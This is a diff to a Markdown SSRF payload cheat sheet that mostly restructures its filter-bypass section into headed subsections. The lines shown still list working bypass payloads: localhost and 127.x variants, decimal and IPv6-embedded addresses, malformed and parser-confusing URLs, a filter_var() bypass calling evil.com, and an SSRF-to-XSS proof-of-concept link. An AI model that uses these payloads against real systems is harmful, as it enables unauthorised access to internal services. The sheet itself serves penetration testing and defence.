@@ -7,6 +7,19 @@
 * [Tools](#tools)
 * [Payloads with localhost](#payloads-with-localhost)
 * [Bypassing filters](#bypassing-filters)
+  * [Bypass using HTTPS](#bypass-using-https)
+  * [Bypass localhost with [::]](#bypass-localhost-with----)
+  * [Bypass localhost with a domain redirection](#bypass-localhost-with-a-domain-redirection)
+  * [Bypass localhost with CIDR](#bypass-localhost-with-cidr)
+  * [Bypass using a decimal IP location](#bypass-using-a-decimal-ip-location)
+  * [Bypass using IPv6/IPv4 Address Embedding](#bypass-using-ipv6-ipv4-address-embedding)
+  * [Bypass using malformed urls](#bypass-using-malformed-urls)
+  * [Bypass using rare address](#bypass-using-rare-address)
+  * [Bypass using bash variables](#bypass-using-bash-variables)
+  * [Bypass using tricks combination](#bypass-using-tricks-combination)
+  * [Bypass using enclosed alphanumerics](#bypass-using-enclosed-alphanumerics)
+  * [Bypass filter_var() php function](#bypass-filter-var-php-function)
+  * [Bypass against a weak parser](#bypass-against-a-weak-parser)
 * [SSRF exploitation via URL Scheme](#ssrf-exploitation-via-url-scheme)
   * [file://](#file)
   * [http://](#http)
@@ -15,7 +28,7 @@
   * [tftp://](#tftp)
   * [ldap://](#ldap)
   * [gopher://](#gopher)
-* [SSRF to XSS](#ssrf-to-xss-by-d0rkerdevil--alyssaoherrera)
+* [SSRF to XSS](#ssrf-to-xss)
 * [SSRF URL for Cloud Instances](#ssrf-url-for-cloud-instances)
   * [SSRF URL for AWS Bucket](#ssrf-url-for-aws-bucket)
   * [SSRF URL for AWS Elastic Beanstalk](#ssrf-url-for-aws-elastic-beanstalk)
@@ -75,14 +88,14 @@ Using this vulnerability users can upload images from any image URL = trigger an
 
 ## Bypassing filters
 
-Bypass using HTTPS
+### Bypass using HTTPS
 
 ```powershell
 https://127.0.0.1/
 https://localhost/
 ```
 
-Bypass localhost with [::]
+### Bypass localhost with [::]
 
 ```powershell
 http://[::]:80/
@@ -98,7 +111,7 @@ http://0000::1:22/ SSH
 http://0000::1:3128/ Squid
 ```
 
-Bypass localhost with a domain redirecting to locahost
+### Bypass localhost with a domain redirection
 
 ```powershell
 http://localtest.me
@@ -113,16 +126,17 @@ The service nip.io is awesome for that, it will convert any ip address as a dns.
 NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even 127.0.0.1.nip.io maps to 127.0.0.1
 ```
 
-Bypass localhost with CIDR : 127.x.x.x
+### Bypass localhost with CIDR 
+
+It's a /8
 
 ```powershell
-it's a /8
 http://127.127.127.127
 http://127.0.1.3
 http://127.0.0.0
 ```
 
-Bypass using a decimal ip location
+### Bypass using a decimal IP location
 
 ```powershell
 http://0177.0.0.1/
@@ -131,20 +145,24 @@ http://3232235521/ = http://192.168.0.1
 http://3232235777/ = http://192.168.1.1
 ```
 
-Bypass using [IPv6/IPv4 Address Embedding](http://www.tcpipguide.com/free/t_IPv6IPv4AddressEmbedding.htm)
+### Bypass using IPv6/IPv4 Address Embedding
+
+[IPv6/IPv4 Address Embedding](http://www.tcpipguide.com/free/t_IPv6IPv4AddressEmbedding.htm)
 
 ```powershell
 http://[0:0:0:0:0:ffff:127.0.0.1]
 ```
 
-Bypass using malformed urls
+### Bypass using malformed urls
 
 ```powershell
 localhost:+11211aaa
 localhost:00011211aaaa
 ```
 
-Bypass using rare address, you can short-hand IP addresses by dropping the zeros
+### Bypass using rare address
+
+You can short-hand IP addresses by dropping the zeros
 
 ```powershell
 http://0/
@@ -152,14 +170,16 @@ http://127.1
 http://127.0.1
 ```
 
-Bypass using bash variables (curl only)
+### Bypass using bash variables 
+
+(curl only)
 
 ```powershell
 curl -v "http://evil$google.com"
 $google = ""
 ```
 
-Bypass using tricks combination
+### Bypass using tricks combination
 
 ```powershell
 http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
@@ -168,7 +188,9 @@ requests + browsers : 2.2.2.2
 urllib : 3.3.3.3
 ```
 
-Bypass using enclosed alphanumerics [@EdOverflow](https://twitter.com/EdOverflow)
+### Bypass using enclosed alphanumerics 
+
+[@EdOverflow](https://twitter.com/EdOverflow)
 
 ```powershell
 http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
@@ -177,13 +199,15 @@ List:
 ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
 ```
 
-Bypass filter_var() php function
+### Bypass filter_var() php function
 
 ```powershell
 0://evil.com:80;http://google.com:80/ 
 ```
 
-Bypass against a weak parser - by Orange Tsai ([Blackhat A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf))
+### Bypass against a weak parser
+
+by Orange Tsai ([Blackhat A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf))
 
 ```powershell
 http://127.1.1.1:80\@127.2.2.2:80/
@@ -317,7 +341,9 @@ Content of evil.com/redirect.php:
 ?>
 ```
 
-## SSRF to XSS by [@D0rkerDevil & @alyssa.o.herrera](https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158)
+## SSRF to XSS 
+
+by [@D0rkerDevil & @alyssa.o.herrera](https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158)
 
 ```bash
 http://brutelogic.com.br/poc.svg -> simple alert
